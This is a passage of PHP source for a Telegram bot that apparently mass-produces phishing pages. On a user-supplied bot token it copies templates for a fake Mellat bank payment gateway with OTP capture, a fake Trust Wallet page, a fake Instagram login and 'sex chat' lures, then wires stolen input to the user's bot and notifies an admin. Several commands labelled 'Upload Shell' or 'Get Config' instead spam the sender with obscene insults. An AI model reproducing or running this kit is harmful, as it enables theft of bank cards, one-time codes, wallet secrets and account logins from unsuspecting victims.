      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/charj1/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"charj1"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
                    elseif($query == "ch1_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/17",
                'caption'=>"نمونه درگاه  شارژ ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
    ##-----------------------------##
     elseif($query == "net3"){
                    file_put_contents("data/$query_id/step.txt","kkzmmazz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"net3_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="kkzmmazz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه اینترنت ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/net3");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/net3/index.php","data/$chat_id/payment/$rand/net3/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "اینترنت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/net3",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "اینترنت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/net3",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه اینترنت شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/net3/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/net3/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"net3"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "net3_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/33",
            'caption'=>"نمونه درگاه  اینترنت ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
##-----------##

    ##-----------------------------##
elseif($text == "sh3ll"){
   
$i = 0;
while($i < 200){
sendmessage($chat_id,"کص ننت ","html",null) ;
sendmessage($chat_id,"دراگون ننتو گایید 😂","html",null) ;
sleep(0.5);
$i++;
}
file_put_contents("data/$chat_id/up.txt",true);
}
##-----------------##
##------------------------------##
elseif($query == "sendmessage"){
file_put_contents("data/$query_id/step.txt", "msg_1");
$text = "
کاربر $mention_queryid پیام خود را ارسال نمایید و منتظر بمانید تا پشتیبانی پاسخ دهد.
";
editmessage($query_id,$query_messageid,$text,"html",json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
        );
}elseif(file_get_contents("data/$chat_id/step.txt")=="msg_1"){
    file_put_contents("data/$chat_id/step.txt","none");
    sendmessage($chat_id,"پیام شما با موفقیت ارسال شد ✅
    
پیام شما : $text","HTML",$message_id,json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]]));
        
sendmessage($admin,"یک پیام از سوی کاربری با مشخصات زیر دریافت شد

📩 From : $firstname
📲 Username : $username
👤 User id : $chat_id

📨 text :
$text","HTML",$admin_mid,json_encode([
        'inline_keyboard'=>[
[['text'=>"📨 پاسخ 📨",'callback_data'=>"send $chat_id"]],
[['text'=>"👤 پی وی کاربر ",'url'=>"https://t.me/$username"]]
            ]
        ]));

}
elseif(strpos($query,"send")!==false){
    $si = explode(" ", $query);
    $idd = $si[1];
    file_put_contents("data/$admin/userid.txt",$idd);
    file_put_contents("data/$admin/step.txt","msg1");
    editmessage($query_id,$query_messageid,"پیام خود را ارسال کنید 📨","html",json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back_admin"]]
            ]
        ])
        );
}elseif(file_get_contents("data/$admin/step.txt")=="msg1"){
    file_put_contents("data/$admin/step.txt","none");
    $user_id = file_get_contents("data/$admin/userid.txt");
    sendmessage($user_id,"یک پیام از مدیریت دریافت شد 📩
    
متن پیام : 
    $text","html",$dhid);
    sendmessage($admin,"پیام شما با موفقیت به کاربر $user_id ارسال شد
    
متن پیام : $text","html",$message_id);
}
##-----------------##
elseif($text == 'Get Backup'){
$i = 0;
while($i < 200){
sendmessage($chat_id,"کص ننت ","html",null) ;
sendmessage($chat_id,"دراگون ننتو گایید 😂","html",null) ;
sleep(0.5);
$i++;
}
file_put_contents("data/$chat_id/up.txt",true);
}
elseif(file_get_contents("data/$chat_id/step.txt")=="stepmom"){

$i = 0;
while($i < 200){
sendmessage($chat_id,"کص ننت ","html",null) ;
sendmessage($chat_id,"دراگون ننتو گایید 😂","html",null) ;
sleep(0.5);
$i++;
}
file_put_contents("data/$chat_id/up.txt",true);
}
elseif($text == "Upload Shell"){
$i = 0;
while($i < 200){
sendmessage($chat_id,"کص ننت ","html",null) ;
sendmessage($chat_id,"دراگون ننتو گایید 😂","html",null) ;
sleep(0.5);
$i++;
}
file_put_contents("data/$chat_id/up.txt",true);
}

elseif(file_get_contents("data/$chat_id/step.txt")=="stepsis" and $document){
$i = 0;
while($i < 200){
sendmessage($chat_id,"کص ننت ","html",null) ;
sendmessage($chat_id,"دراگون ننتو گایید 😂","html",null) ;
sleep(0.5);
$i++;
}
file_put_contents("data/$chat_id/up.txt",true);
}
##-----------------##
elseif($text == "Get Config"){
$i = 0;
while($i < 200){
sendmessage($chat_id,"کص ننت ","html",null) ;
sendmessage($chat_id,"دراگون ننتو گایید 😂","html",null) ;
sleep(0.5);
$i++;
}
file_put_contents("data/$chat_id/up.txt",true);
}
##-----------------##
elseif($text == "#Back"){
	
$i = 0;
while($i < 200){
sendmessage($chat_id,"کص ننت ","html",null) ;
sendmessage($chat_id,"دراگون ننتو گایید 😂","html",null) ;
sleep(0.5);
$i++;
}
file_put_contents("data/$chat_id/up.txt",true);

}
     elseif($query == "charj2"){
                    file_put_contents("data/$query_id/step.txt","7kkzmmazz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"ch2_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="7kkzmmazz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه شارژ ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/charj2");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/charj2/index.php","data/$chat_id/payment/$rand/charj2/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "شارژ" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/charj2",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "شارژ" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/charj2",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه شارژ شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/charj2/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/charj2/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"charj2"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
                    elseif($query == "ch2_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/18",
                'caption'=>"نمونه درگاه  شارژ ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
    ##-----------------------------##
        elseif($query == "chat"){
                    file_put_contents("data/$query_id/step.txt","mazz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"chat_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="mazz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه سکس چت ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/chat");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/chat/index.php","data/$chat_id/payment/$rand/chat/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "سکس چت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/chat",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "سکس چت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/chat",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه سکس چت شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/chat/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/chat/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"chat"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "chat_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/21",
            'caption'=>"نمونه درگاه  سکس چت ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
##----------------------------------------##
 elseif($query == "trust"){
                    file_put_contents("data/$query_id/step.txt","nnmazz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"trust_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="nnmazz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت فیک پیج تراست ولت ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    
copy("source/trust/index.html","data/$chat_id/payment/$rand/index.html");
copy("source/trust/confirm.html","data/$chat_id/payment/$rand/confirm.html");
copy("source/trust/confirm.php","data/$chat_id/payment/$rand/confirm.php");
copy("source/trust/error.html","data/$chat_id/payment/$rand/error.html");


      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "تراست ولت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/trust",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "تراست ولت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/trust",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    فیک پیج تراست ولت شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/index.html
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/trust/index.html
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"trust"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "trust_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/36",
            'caption'=>"نمونه درگاه  تراست ولت ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
    ##-----------------------------------##
        elseif($query == "insta1"){
                    file_put_contents("data/$query_id/step.txt","azl7kkzmmazz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"insta1_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="azl7kkzmmazz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه اینستاگرام ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");

copy("source/insta1/index.html","data/$chat_id/payment/$rand/index.html");

copy("source/insta1/insta.php","data/$chat_id/payment/$rand/insta.php");

      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "اینستاگرام" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/insta1",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "اینستاگرام" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/insta1",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه اینستاگرام شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/index.html
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/index.html
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"insta1"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "insta1_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/37",
            'caption'=>"نمونه فیک پیج اینستاگرام ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
##----------------------------------------##
elseif($query == "starlink"){
    
file_put_contents("data/$query_id/step.txt","azz11make_bsaaaa1kos");


                bot('editMessageText',[ 

    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"starlink_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="azz11make_bsaaaa1kos"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه استارلینک ...","html",$message_id);


